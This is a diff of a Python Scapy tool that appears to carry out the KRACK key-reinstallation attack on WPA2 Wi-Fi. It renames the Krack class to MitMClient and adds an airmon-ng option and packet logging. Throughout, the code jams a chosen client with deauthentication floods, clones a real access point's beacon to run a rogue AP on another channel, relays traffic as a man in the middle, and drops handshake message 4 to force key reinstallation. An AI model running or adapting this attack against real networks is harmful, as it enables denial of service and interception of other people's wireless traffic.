@@ -2,49 +2,83 @@
 # -*- coding: UTF-8 -*-
 
 import argparse
-import threading
-import re
-import time
 import ctypes
-import struct
-from scapy.all import *
-
+from ctypes.util import find_library
 import logging
+import threading
 
-from scapy.layers.dot11 import Dot11
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
 
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
-conf.verb = 0
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up Scapy
+
+conf.verb = 0  # Scapy I thought I told you to shut up
 
 DEBUG = False
+# DEBUG = True
 MAXTIMEOUT = 5
 if DEBUG: MAXTIMEOUT = 0.1
-SEQNUM = 0
+SEQ_NUM = 0
 JAMMING = None
 event_jamming = None
 jamming_thread = None
-PTKINSTALLED = False
+PTK_INSTALLED = False
 DEBUG_C = 0
 
 channels = {
-    1: "\x6c\x09",
-    2: "\x71\x09",
-    3: "\x76\x09",
-    4: "\x7b\x09",
-    5: "\x80\x09",
-    6: "\x85\x09",
-    7: "\x8a\x09",
-    8: "\x8f\x09",
-    9: "\x94\x09",
-    10: "\x99\x09",
-    11: "\x9e\x09",
-    12: "\xa3\x09",
-    13: "\xa8\x09",
-    14: "\xb4\x09"
+    1: "\x6c\x09",  # 2412
+    2: "\x71\x09",  # 2417
+    3: "\x76\x09",  # 2422
+    4: "\x7b\x09",  # 2427
+    5: "\x80\x09",  # 2432
+    6: "\x85\x09",  # 2437
+    7: "\x8a\x09",  # 2442
+    8: "\x8f\x09",  # 2447
+    9: "\x94\x09",  # 2452
+    10: "\x99\x09",  # 2457
+    11: "\x9e\x09",  # 2462
+    12: "\xa3\x09",  # 2467
+    13: "\xa8\x09",  # 2472
+    14: "\xb4\x09"  # 2484
+}
+
+pkt_types = {
+    0: {
+        0x00: "Assoc Req",
+        0x01: "Assoc Res",
+        0x02: "Reass Req",
+        0x03: "Reass Res",
+        0x04: "Probe Req",
+        0x05: "Probe Res",
+        0x08: "Beacon   ",
+        0x09: "AITM     ",
+        0x0a: "Disassoc.",
+        0x0b: "Authenti.",
+        0x0c: "Deauthent",
+        0x0d: "Action   ",
+    },
+    2: {
+        0x00: "Data     ",
+        0x01: "Data     ",
+        0x02: "Data     ",
+        0x03: "Data     ",
+        0x04: "Null     ",
+        0x05: "Cf       ",
+        0x06: "CF       ",
+        0x07: "CF       ",
+        0x08: "QoS data ",
+        0x09: "QoS data ",
+        0x0A: "QoS data ",
+        0x0B: "QoS data ",
+        0x0C: "QoS null ",
+        0x0D: "Reserved ",
+        0x0E: "QoS data ",
+        0x0F: "QoS data "
+    }
 }
 
 clock_gettime = ctypes.CDLL(ctypes.util.find_library('c'),
-                use_errno=True).clock_gettime
+                            use_errno=True).clock_gettime
 
 if DEBUG:
     packets = rdpcap("./example.pcapng")
@@ -60,6 +94,11 @@ def parse_args():
                         "--direct",
                         action="store_true",
                         help="Skip channel and monitor settings")
+
+    parser.add_argument("-A",
+                        "--airmon",
+                        action="store_true",
+                        help="Use airmon-ng for channel and monitor mode")
 
     parser.add_argument("-a",
                         "--access_point",
@@ -89,12 +128,14 @@ def parse_args():
 
     return parser.parse_args()
 
-class Utils():
 
+
+
+class Utils():
     class timespec(ctypes.Structure):
-                    """Time specification, as described in clock_gettime(3)."""
-                    _fields_ = (('tv_sec', ctypes.c_long),
-                                ('tv_nsec', ctypes.c_long))
+        """Time specification, as described in clock_gettime(3)."""
+        _fields_ = (('tv_sec', ctypes.c_long),
+                    ('tv_nsec', ctypes.c_long))
 
     @staticmethod
     def monotonic():
@@ -104,7 +145,8 @@ class Utils():
 
     @staticmethod
     def get_monotonic_str():
-        return struct.pack("<Q", int(Utils.monotonic()*100000))[:5]
+        return struct.pack("<Q", int(Utils.monotonic() * 100000))[:5]
+
 
 class Logger():
     def __init__(self):
@@ -163,14 +205,19 @@ class Jammer:
         self.direct = args.direct
 
     def deauth(self, e):
-        global SEQNUM
+        global SEQ_NUM
 
         pkts = []
 
-        deauth_pkt1 = RadioTap()/Dot11(addr1=self.client_mac, addr2=self.ap_mac, addr3=self.ap_mac) / Dot11Deauth()
-        deauth_pkt2 = RadioTap()/Dot11(addr1=self.ap_mac, addr2=self.client_mac, addr3=self.client_mac) / Dot11Deauth()
+        deauth_pkt1 = RadioTap() / Dot11(addr1=self.client_mac, addr2=self.ap_mac, addr3=self.ap_mac) / Dot11Deauth()
+
+        deauth_pkt2 = RadioTap() / Dot11(addr1=self.ap_mac, addr2=self.client_mac,
+                                         addr3=self.client_mac) / Dot11Deauth()
         pkts.append(deauth_pkt1)
         pkts.append(deauth_pkt2)
+
+        deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + channels[self.ap_channel] + deauth_pkt1[RadioTap].notdecoded[12:]
+        deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + channels[self.ap_channel] + deauth_pkt1[RadioTap].notdecoded[12:]
 
         logger.log(
             "Starting deauth on AP [G]"
@@ -179,8 +226,9 @@ class Jammer:
 
         while not e.isSet():
             for p in pkts:
-                SEQNUM += 1
-                p[RadioTap].SC = SEQNUM 
+                SEQ_NUM += 1
+                p[RadioTap].SC = SEQ_NUM
+                p[Dot11].FCfield |= 0x20
                 sendp(p, iface=self.iface_ap, inter=0.1 / len(pkts))
 
         logger.log("Deauth [G]stopped[/G]")
@@ -199,7 +247,7 @@ class SocketClient(L2Socket):
             return None
 
 
-class Krack:
+class MitMClient:
     def __init__(self, args):
         self.iface_ap = args.iface_ap
         self.iface_client = args.iface_client
@@ -208,6 +256,7 @@ class Krack:
         self.ap_mac = None
         self.client_mac = args.client
         self.direct = args.direct
+        self.airmon = args.airmon
         self.ap_beacon = None
         self.ap_probe_response = None
 
@@ -223,34 +272,41 @@ class Krack:
             '''
             Turn off interfaces
             '''
-            self.ifaces_down()
-            '''
-            Switch AP iface channel
-            '''
-            self.set_iface_ap_channel()
-            '''
-            Switch Client iface channel
-            '''
-            self.set_iface_client_channel()
-            '''
-            Start monitor mode on ap
-            '''
-            self.start_ap_mon_mode()
-            '''
-            Start monitor mode on client
-            '''
-            self.start_client_mon_mode()
-            '''
-            Turn on interfaces
-            '''
-            self.ifaces_up()
-
+            if not self.airmon:
+                self.ifaces_down()
+                '''
+                Switch AP iface channel
+                '''
+                self.set_iface_ap_channel()
+                '''
+                Switch Client iface channel
+                '''
+                self.set_iface_client_channel()
+                '''
+                Start monitor mode on ap
+                '''
+                self.start_ap_mon_mode()
+                '''
+                Start monitor mode on client
+                '''
+                self.start_client_mon_mode()
+                '''
+                Turn on interfaces
+                '''
+                self.ifaces_up()
+            else:
+                self.set_iface_channel()
         else:
             logger.log("Channel and Monitor settings skipped!", "warning")
 
         args.ap_mac = self.get_ap_mac()
 
         logger.log("Jammer initialized correctly", "success")
+
+    def set_iface_channel(self):
+        logger.log("Switch channel and monitor mode for ifaces")
+        os.system('airmon-ng start %s %s' % (self.iface_ap, str(self.ap_channel)))
+        os.system('airmon-ng start %s %s' % (self.iface_client, str(self.client_channel)))
 
     def ifaces_down(self):
         logger.log("Turning off both interfaces")
@@ -264,7 +320,8 @@ class Krack:
         except Exception:
             logger.log("Channel setting failed.", "error")
             sys.exit()
-        logger.log("Interface [G]" + self.iface_ap + "[/G] is on channel [G]" + str(self.ap_channel) + "[/G]", "success")
+        logger.log("Interface [G]" + self.iface_ap + "[/G] is on channel [G]" + str(self.ap_channel) + "[/G]",
+                   "success")
 
     def set_iface_client_channel(self):
         logger.log(
@@ -333,7 +390,7 @@ class Krack:
             # If AP MAC address could not be found
             logger.log("Could not retreive an AP Beacon", "error")
             sys.exit()
-        logger.log("AP Beacon saved!", "success")   
+        logger.log("AP Beacon saved!", "success")
         return pkt
 
     def cb_get_ap_beacon(self, pkt):
@@ -346,7 +403,7 @@ class Krack:
             return True
 
     def get_ap_probe_response(self):
-        global probe_response_example, SEQNUM
+        global probe_response_example, SEQ_NUM
         logger.log("Sniffing an AP Probe response...")
         pkt = sniff(iface=self.iface_ap, stop_filter=self.cb_get_ap_probe_response, store=0, timeout=MAXTIMEOUT)
         if DEBUG:
@@ -356,7 +413,7 @@ class Krack:
             logger.log("Could not retreive an AP Probe response", "error")
             sys.exit()
         logger.log("AP Probe response saved!", "success")
-        SEQNUM = self.ap_probe_response[Dot11].SC
+        SEQ_NUM = self.ap_probe_response[Dot11].SC
         return pkt
 
     def cb_get_ap_probe_response(self, pkt):
@@ -392,13 +449,14 @@ class Krack:
         self.sock_ap = L2Socket(iface=self.iface_ap, type=ETH_P_ALL)
         self.sock_client = L2Socket(iface=self.iface_client, type=ETH_P_ALL)
 
-    @staticmethod
-    def is_handshake_packet(pkt):
+    def is_handshake_packet(self, pkt):
         return (pkt.type == 0
                 and pkt.subtype == 4  # Probe Request
+                and pkt[Dot11].addr2 == self.client_mac
                 and pkt[Dot11].addr1.lower() == "ff:ff:ff:ff:ff:ff")
 
     def handle_pkt_ap(self):
+        global pkt_types, JAMMING
         pkt = self.sock_ap.recv()
 
         # Don't forward not Dot11 packets, or packets not sent to our client
@@ -412,21 +470,26 @@ class Krack:
         if pkt.type == 1:  # TYPE_CNTRL
             return 0
 
+
+
         # Drop Beacons as we inject ours
         if pkt.type == 0 and pkt.subtype == 0x08:  # Beacon
             return 0
 
-        # Check if pkt needs to be forwarded or not
+        logger.log("[" + ("*" if pkt[Dot11].FCfield & 0x20 != 0 else " ") + "] [R]AP[/R] : " + pkt_types[pkt.type][
+            pkt.subtype] + " - src: " + pkt[Dot11].addr2 + " | dst: " + pkt[Dot11].addr1 + ' - ' + str(
+            self.find_channel(pkt)))
 
+        # Check if pkt needs to be forwarded or not
         res = self.analyze_traffic(pkt)
 
         if res > 0:
             self.send_to_client(pkt)
 
     def handle_pkt_client(self):
-        global SEQNUM, JAMMING, PTKINSTALLED, jamming_thread, event_jamming, DEBUG_C
+        global SEQ_NUM, JAMMING, PTK_INSTALLED, jamming_thread, event_jamming, DEBUG_C, pkt_types
         if DEBUG:
-            pkt = packets[DEBUG_C + 5577] # Probe Request
+            pkt = packets[DEBUG_C + 5577]  # Probe Request
         else:
             pkt = self.sock_client.recv()
 
@@ -437,12 +500,11 @@ class Krack:
         # Don't forward control frames
         if pkt.type == 1:  # TYPE_CNTRL
             return 0
-            
-        # Forward to AP or probe requests
-        if ((pkt[Dot11].addr1 != self.ap_mac
-            or pkt[Dot11].addr2 != self.client_mac)
-            and not self.is_handshake_packet(pkt)):
 
+        # Forward to AP or probe requests
+        if (((pkt[Dot11].addr1 != self.ap_mac and pkt[Dot11].addr3 != self.ap_mac)
+             or pkt[Dot11].addr2 != self.client_mac)
+            or self.is_handshake_packet(pkt)):
             return 0
 
         # Probe Request, we reply ourselves
@@ -450,8 +512,8 @@ class Krack:
             # Update Sequence Number
 
             logger.log("Probe request to our AP")
-            SEQNUM += 1
-            self.ap_probe_response[Dot11].SC = SEQNUM
+            SEQ_NUM += 1
+            self.ap_probe_response[Dot11].SC = SEQ_NUM
             self.send_to_client(self.ap_probe_response)
 
             return 0
@@ -464,11 +526,11 @@ class Krack:
             logger.log("MitM attack has [G]started[/G]", "success")
 
         if pkt.type == 2 and pkt.subtype == 0x08 and str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
-            if not PTKINSTALLED:
+            if not PTK_INSTALLED:
                 logger.log("PKT [G]installed[/G] on client", "success")
             else:
                 logger.log("PKT [G]RE-installed[/G] on client! Key Reinstallation succes!", "success")
-            PTKINSTALLED = True
+            PTK_INSTALLED = True
 
             # Don't forward, AP will think no response and send msg3 again
             return 0
@@ -477,56 +539,77 @@ class Krack:
         res = self.analyze_traffic(pkt)
 
         if res > 0:
-
             self.send_to_ap(pkt)
 
     def send_ap_beacon(self):
+        global SEQ_NUM
         logger.log("Rogue AP started. Sending beacons...", "success")
-        sendp(self.ap_beacon, iface=self.iface_client, inter=0.1, loop=1)
+        self.set_channel(self.ap_beacon, self.client_channel)
+        while True:
+            SEQ_NUM += 1
+            self.ap_beacon[RadioTap].SC = SEQ_NUM
+            self.ap_beacon[Dot11].FCfield |= 0x20
+
+            sendp(self.ap_beacon, iface=self.iface_client)
 
     def analyze_traffic(self, pkt):
         # do not forward probe responses, we reply ourselves
         if pkt.type == 0 and pkt.subtype == 0x05:
             return 0
 
-        # @TODO fix network name in association request (doesn't contain channel) ?
-
-        if pkt.type == 10 and pkt.subtype == 0x28:  # Data - QoS data
-            if pkt[Raw].startswith("\x02\x00\x8a"):  # Msg1
+        if pkt.type == 2 and pkt.subtype == 0x8 and Raw in pkt:  # Data - QoS data
+            if str(pkt[Raw]).startswith("\x02\x00\x8a"):  # Msg1
                 logger.log("4-way handshake : [G]Messag 1/4[/G]", "success")
-            elif pkt[Raw].startswith("\x02\x01\x0a"):  # Msg2
+            elif str(pkt[Raw]).startswith("\x02\x01\x0a"):  # Msg2
                 logger.log("4-way handshake : [G]Messag 2/4[/G]", "success")
-            elif pkt[Raw].startswith("\x02\x13\xca"):  # Msg3
+            elif str(pkt[Raw]).startswith("\x02\x13\xca"):  # Msg3
                 logger.log("4-way handshake : [G]Messag 3/4[/G]", "success")
-            elif pkt[Raw].startswith("\x02\x03\x0a"):  # Msg4
+            elif str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
                 logger.log("4-way handshake : [G]Messag 4/4[/G]", "success")
+            else:
+                logger.log("4-way handshake : [G]UNKNOWN[/G]", "error")
+            return 0
+
+        if pkt[Dot11].FCfield & 0x20 != 0:
             return 0
 
         return 1
 
     def send_to_ap(self, pkt):
-        global SEQNUM
+        global SEQ_NUM
         self.update_ts(pkt)
         self.set_channel(pkt, self.ap_channel)
 
-        SEQNUM += 1
-        pkt[RadioTap].SC = SEQNUM 
+        SEQ_NUM += 1
+        pkt[RadioTap].SC = SEQ_NUM
 
+        # Hack to check injected data
+        pkt[Dot11].FCfield |= 0x20
         sendp(pkt, iface=self.iface_ap)
 
     def send_to_client(self, pkt):
-        global SEQNUM
+        global SEQ_NUM
         self.update_ts(pkt)
         self.set_channel(pkt, self.client_channel)
 
-        SEQNUM += 1
-        pkt[RadioTap].SC = SEQNUM 
+        SEQ_NUM += 1
+        pkt[RadioTap].SC = SEQ_NUM
 
+        # Hack to check injected data
+        pkt[Dot11].FCfield |= 0x20
         sendp(pkt, iface=self.iface_client)
 
     def set_channel(self, pkt, channel):
         pkt[RadioTap].notdecoded = pkt[RadioTap].notdecoded[:10] + channels[channel] + pkt[RadioTap].notdecoded[12:]
-        
+
+    def find_channel(self, pkt):
+        global channels
+        fq = pkt[RadioTap].notdecoded[10:12]
+        for i,v in channels.iteritems():
+            if v == fq:
+                return i
+        return [pkt[RadioTap].notdecoded[10:12]]
+
     def update_ts(self, pkt):
         pkt[RadioTap].notdecoded = Utils.get_monotonic_str() + pkt[RadioTap].notdecoded[5:]
 
@@ -559,7 +642,7 @@ if __name__ == "__main__":
     """
     0. Initialization
     """
-    krack = Krack(args)
+    mitmClient = MitMClient(args)
 
     s_ap = SocketClient(iface=args.iface_ap)
     s_client = SocketClient(iface=args.iface_client)
@@ -567,22 +650,22 @@ if __name__ == "__main__":
     """
     1. Get Beacon of AP to clone
     """
-    krack.get_ap_beacon()
+    mitmClient.get_ap_beacon()
 
     """
     2. Get probe response we will use ourselves
     """
-    krack.get_ap_probe_response()
+    mitmClient.get_ap_probe_response()
 
     """
     3. Set device MAC address
     """
-    krack.set_iface_mac_address()
+    mitmClient.set_iface_mac_address()
 
     """
     4. Start Fake AP Beaconing
     """
-    ap_beacon_thread = threading.Thread(target=krack.send_ap_beacon)
+    ap_beacon_thread = threading.Thread(target=mitmClient.send_ap_beacon)
     ap_beacon_thread.setDaemon(True)
     ap_beacon_thread.start()
 
@@ -599,4 +682,4 @@ if __name__ == "__main__":
     """
     6. Forward traffic when needed
     """
-    krack.run()
+    mitmClient.run()
